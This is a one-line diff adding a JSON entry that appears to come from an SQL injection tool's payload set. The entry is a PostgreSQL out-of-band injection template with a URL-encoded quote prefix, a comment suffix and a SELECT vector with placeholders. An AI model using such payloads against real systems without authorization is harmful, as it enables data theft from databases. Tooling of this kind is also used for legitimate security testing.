@@ -1,0 +1,1 @@
+{"dbms": "pgsql", "technique": "oob", "boundary": {"prefix": "%27", "suffix": "-- -", "type": "single-enc"}, "vector": "{B} AND 1=(SELECT ({Q}))/*OOB {OOB}*/", "comment": "pgsql oob: url-enc single"}
